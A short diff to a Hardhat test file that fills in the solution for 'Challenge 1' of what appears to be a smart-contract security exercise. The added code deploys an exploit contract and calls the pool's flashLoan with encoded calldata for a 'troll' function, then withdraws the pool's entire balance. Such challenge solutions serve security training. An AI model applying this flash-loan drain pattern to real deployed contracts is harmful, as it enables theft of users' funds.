@@ -76,7 +76,20 @@ describe("Solve Challenge 1", function () {
         ///////////////////////////////////////////////////
 
         //======= COMPLETE THIS SECTION AS YOU REQUIRE =======
+        const exploit1Factory = await ethers.getContractFactory("Exploit1");    
+        const exploit1 = await exploit1Factory.connect(challenger).deploy();
+        await exploit1.deployed();
 
+        let calldata = await exploit1.interface.encodeFunctionData(
+            "troll", [challengerAddress,ethers.utils.parseEther(poolPreHack)]
+        );
+        
+        await pool.flashLoan(
+            exploit1.address,
+            calldata
+        );
+        
+        await pool.withdraw(ethers.utils.parseEther(poolPreHack));
         //====================================================
 
         ///////////////////////////////////////////////////
